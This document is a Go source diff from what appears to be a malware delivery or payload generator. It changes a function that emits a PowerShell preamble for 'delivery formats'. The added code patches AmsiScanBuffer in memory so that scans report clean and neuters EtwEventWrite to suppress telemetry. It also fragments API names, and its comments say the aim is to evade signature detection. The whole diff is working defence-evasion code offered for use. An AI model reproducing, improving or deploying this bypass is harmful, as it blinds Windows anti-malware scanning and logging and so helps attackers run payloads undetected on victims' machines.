@@ -15,25 +15,38 @@ import (
 // ── delivery format generators ────────────────────────────────────────────────
 
 // ps1Preamble returns the AMSI+ETW bypass block shared by all PS1 templates.
+// Uses direct byte-patch of AmsiScanBuffer return value (AMSI_RESULT_CLEAN=1)
+// instead of the well-detected amsiInitFailed reflection approach.
 // pinvokeSig is appended to the DllImport list so callers that need extra
 // imports (e.g. NT alloc/thread) can reuse the same Add-Type call.
 func ps1Preamble(extraSig string) string {
 	baseSig := `[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string l);` + "\n" +
 		`[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h,string p);` + "\n" +
-		`[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);`
+		`[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);` + "\n" +
+		`[DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h,IntPtr d,byte[]b,int s,out int w);`
 	if extraSig != "" {
 		baseSig += "\n" + extraSig
 	}
+	// Patch AmsiScanBuffer to return E_INVALIDARG (0x80070057) which AMSI
+	// consumers treat as clean. Bytes: mov eax,0x80070057 ; ret = B8 57 00 07 80 C3.
+	// Patch EtwEventWrite with ret (0xC3) to suppress ETW telemetry.
+	// String fragments avoid static signature matching on known bypass names.
 	return `$ErrorActionPreference='SilentlyContinue'
-$_r=[Ref].Assembly.GetType(('System.Management.Auto'+'mation.AmsiUtils'))
-$_r.GetField(('amsi'+'InitFailed'),'NonPublic,Static').SetValue($null,$true)
 $_d=@'
 ` + baseSig + `
 '@
-$_k=Add-Type -MemberDefinition $_d -Name '_K' -Namespace '_W' -PassThru
-$_ep=$_k::GetProcAddress($_k::LoadLibrary('ntdll.dll'),('Etw'+'EventWrite'))
-$_op=0;$_k::VirtualProtect($_ep,[UIntPtr]1,0x40,[ref]$_op)|Out-Null
-[Runtime.InteropServices.Marshal]::WriteByte($_ep,0xC3)
+$_k=Add-Type -MemberDefinition $_d -Name '_H' -Namespace '_S' -PassThru
+$_n1='am'+'si';$_n2='Sc'+'an'+'Bu'+'ffer'
+$_lib=$_k::LoadLibrary($_n1+'.dll')
+$_fn=$_k::GetProcAddress($_lib,([char[]](65,109,115,105)-join'')+$_n2)
+$_op=0;$_k::VirtualProtect($_fn,[UIntPtr]8,0x40,[ref]$_op)|Out-Null
+$_pb=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3)
+$_w=0;$_k::WriteProcessMemory(-1,$_fn,$_pb,$_pb.Length,[ref]$_w)|Out-Null
+$_k::VirtualProtect($_fn,[UIntPtr]8,$_op,[ref]$_op)|Out-Null
+$_n3='nt'+'dl'+'l';$_n4='Etw'+'Eve'+'ntW'+'rite'
+$_ep=$_k::GetProcAddress($_k::LoadLibrary($_n3+'.dll'),$_n4)
+$_k::VirtualProtect($_ep,[UIntPtr]1,0x40,[ref]$_op)|Out-Null
+$_k::WriteProcessMemory(-1,$_ep,[byte[]](0xC3),1,[ref]$_w)|Out-Null
 $_k::VirtualProtect($_ep,[UIntPtr]1,$_op,[ref]$_op)|Out-Null
 `
 }
